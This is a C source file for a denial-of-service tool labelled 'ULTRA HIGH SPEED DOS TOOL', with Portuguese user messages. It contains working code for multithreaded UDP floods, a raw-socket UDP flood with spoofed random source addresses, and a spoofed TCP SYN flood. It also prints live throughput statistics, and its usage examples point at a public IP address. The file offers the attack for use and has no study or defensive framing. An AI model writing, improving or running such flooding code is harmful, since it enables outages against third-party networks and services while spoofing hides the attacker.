#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <sched.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 80
#define DEFAULT_SIZE 9000
#define MAX_THREADS 500
#define SOCKETS_PER_THREAD 8

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int use_raw;
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;
volatile unsigned long long last_bytes = 0;
volatile unsigned long long last_packets = 0;
pthread_spinlock_t stats_lock;

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i += 4) {
        uint32_t r = rand();
        memcpy(buffer + i, &r, 4);
    }
}

uint32_t random_ip() {
    return (rand() & 0xFF) << 24 |
           (rand() & 0xFF) << 16 |
           (rand() & 0xFF) << 8 |
           (rand() & 0xFF);
}

void *raw_udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int socks[SOCKETS_PER_THREAD];
    char packets[SOCKETS_PER_THREAD][MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (socks[i] < 0) {
            for (int j = 0; j < i; j++) close(socks[j]);
            return NULL;
        }
        int one = 1;
        setsockopt(socks[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        int bufsize = 1024 * 1024 * 16;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        memset(packets[i], 0, MAX_PACKET);
        ip_header = (struct iphdr *)packets[i];
        udp_header = (struct udphdr *)(packets[i] + sizeof(struct iphdr));
        payload = (unsigned char *)(packets[i] + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;

        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
    }

    end_time = time(NULL) + args->duration;
    int sock_idx = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packets[sock_idx];
        udp_header = (struct udphdr *)(packets[sock_idx] + sizeof(struct iphdr));

        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;
        ip_header->check = 0;

        udp_header->source = htons(1024 + (rand() % 64511));

        ip_header->check = checksum((unsigned short *)packets[sock_idx], packet_size);

        if (sendto(socks[sock_idx], packets[sock_idx], packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            pthread_spin_lock(&stats_lock);
            packets_sent++;
            bytes_sent += packet_size;
            pthread_spin_unlock(&stats_lock);
        }

        sock_idx = (sock_idx + 1) % SOCKETS_PER_THREAD;
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(socks[i]);
    }
    return NULL;
}

void *raw_tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int socks[SOCKETS_PER_THREAD];
    char packets[SOCKETS_PER_THREAD][MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (socks[i] < 0) {
            for (int j = 0; j < i; j++) close(socks[j]);
            return NULL;
        }
        int one = 1;
        setsockopt(socks[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        int bufsize = 1024 * 1024 * 16;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }

    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        memset(packets[i], 0, MAX_PACKET);
        ip_header = (struct iphdr *)packets[i];
        tcp_header = (struct tcphdr *)(packets[i] + sizeof(struct iphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;

        tcp_header->dest = htons(args->port);
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;
    }

    end_time = time(NULL) + args->duration;
    int sock_idx = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packets[sock_idx];
        tcp_header = (struct tcphdr *)(packets[sock_idx] + sizeof(struct iphdr));

        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;
        ip_header->check = 0;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();

        ip_header->check = checksum((unsigned short *)packets[sock_idx], packet_size);

        if (sendto(socks[sock_idx], packets[sock_idx], packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            pthread_spin_lock(&stats_lock);
            packets_sent++;
            bytes_sent += packet_size;
            pthread_spin_unlock(&stats_lock);
        }

        sock_idx = (sock_idx + 1) % SOCKETS_PER_THREAD;
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(socks[i]);
    }
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int socks[SOCKETS_PER_THREAD];
    struct sockaddr_in target_addr;
    unsigned char *packets[SOCKETS_PER_THREAD];
    time_t end_time;

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] < 0) {
            for (int j = 0; j < i; j++) close(socks[j]);
            return NULL;
        }
        int bufsize = 1024 * 1024 * 16;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
        packets[i] = malloc(args->packet_size);
        random_payload(packets[i], args->packet_size);
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;
    int sock_idx = 0;

    while (attack_running && time(NULL) < end_time) {
        if (sendto(socks[sock_idx], packets[sock_idx], args->packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            pthread_spin_lock(&stats_lock);
            packets_sent++;
            bytes_sent += args->packet_size;
            pthread_spin_unlock(&stats_lock);
        }
        sock_idx = (sock_idx + 1) % SOCKETS_PER_THREAD;
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        free(packets[i]);
        close(socks[i]);
    }
    return NULL;
}

void *stats_thread(void *arg) {
    struct timeval start, now;
    gettimeofday(&start, NULL);
    unsigned long long prev_bytes = 0;
    unsigned long long prev_packets = 0;
    
    while (attack_running) {
        usleep(100000);
        
        gettimeofday(&now, NULL);
        double elapsed = (now.tv_sec - start.tv_sec) + 
                        (now.tv_usec - start.tv_usec) / 1000000.0;
        
        pthread_spin_lock(&stats_lock);
        unsigned long long current_bytes = bytes_sent;
        unsigned long long current_packets = packets_sent;
        pthread_spin_unlock(&stats_lock);
        
        unsigned long long diff_bytes = current_bytes - prev_bytes;
        unsigned long long diff_packets = current_packets - prev_packets;
        
        double mbps = (diff_bytes * 8) / 1000000.0;
        double gbps = mbps / 1000.0;
        
        printf("\r[+] Pacotes: %llu | PPS: %llu | %.2f Mbps | %.3f Gbps | %.1fs    ",
               current_packets, diff_packets * 10, mbps * 10, gbps * 10, elapsed);
        fflush(stdout);
        
        prev_bytes = current_bytes;
        prev_packets = current_packets;
    }
    return NULL;
}

void print_usage(char *program_name) {
    printf("\n=== ULTRA HIGH SPEED DOS TOOL ===\n");
    printf("Optimizado para > 1 Gbps\n\n");
    printf("Uso: %s <IP> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
    printf("Argumentos:\n");
    printf("  IP       - Endereco IP do alvo\n");
    printf("  PORTA    - Porta de destino\n");
    printf("  TEMPO    - Duracao em segundos\n\n");
    printf("Opcoes:\n");
    printf("  -T       - Threads (padrao: %d, max: %d)\n", DEFAULT_THREADS, MAX_THREADS);
    printf("  -S       - Tamanho do pacote (padrao: %d, max: 9000)\n", DEFAULT_SIZE);
    printf("  -R       - Raw socket com spoofing (root)\n");
    printf("  -TCP     - TCP SYN Flood (root)\n");
    printf("  -h       - Ajuda\n\n");
    printf("Exemplos:\n");
    printf("  %s 192.168.1.1 80 30 -T 100 -S 9000 -R\n", program_name);
    printf("  sudo %s 1.1.1.1 443 60 -T 200 -S 9000 -R\n", program_name);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *target;
    int port, duration;
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_SIZE;
    int use_raw = 0;
    int use_tcp = 0;
    int opt;

    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }

    target = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    optind = 4;
    while ((opt = getopt(argc, argv, "T:S:Rf h")) != -1) {
        switch (opt) {
            case 'T':
                num_threads = atoi(optarg);
                if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
                if (num_threads < 1) num_threads = 1;
                break;
            case 'S':
                packet_size = atoi(optarg);
                if (packet_size > 9000) packet_size = 9000;
                if (packet_size < 64) packet_size = 64;
                break;
            case 'R':
                use_raw = 1;
                break;
            case 'f':
                use_tcp = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    if (use_raw || use_tcp) {
        if (geteuid() != 0) {
            printf("[!] Precisa de root para spoofing!\n");
            printf("[!] Execute: sudo %s ...\n", argv[0]);
            return 1;
        }
    }

    printf("\n=== INICIANDO ATAQUE HIGH SPEED ===\n");
    printf("Alvo: %s:%d\n", target, port);
    printf("Duracao: %d segundos\n", duration);
    printf("Threads: %d x %d sockets = %d conexoes\n", 
           num_threads, SOCKETS_PER_THREAD, num_threads * SOCKETS_PER_THREAD);
    printf("Tamanho do pacote: %d bytes\n", packet_size);
    printf("Tipo: %s\n", use_tcp ? "TCP SYN Flood" : use_raw ? "UDP Raw Spoofing" : "UDP Normal");
    printf("==================================\n\n");

    srand(time(NULL) ^ getpid());
    signal(SIGPIPE, SIG_IGN);

    pthread_spin_init(&stats_lock, PTHREAD_PROCESS_PRIVATE);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;
        args[i].use_raw = use_raw;

        if (use_tcp) {
            pthread_create(&threads[i], NULL, raw_tcp_flood, &args[i]);
        } else if (use_raw) {
            pthread_create(&threads[i], NULL, raw_udp_flood, &args[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_flood, &args[i]);
        }
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(stats_thread_id);
    pthread_join(stats_thread_id, NULL);

    double total_gb = (bytes_sent * 8) / 1000000000.0;
    double avg_gbps = total_gb / duration;

    printf("\n\n[+] Ataque finalizado!\n");
    printf("[+] Total pacotes: %llu\n", packets_sent);
    printf("[+] Total dados: %.2f GB\n", total_gb);
    printf("[+] Media PPS: %llu\n", packets_sent / duration);
    printf("[+] Media Gbps: %.3f\n", avg_gbps);

    pthread_spin_destroy(&stats_lock);
    free(threads);
    free(args);

    return 0;
}
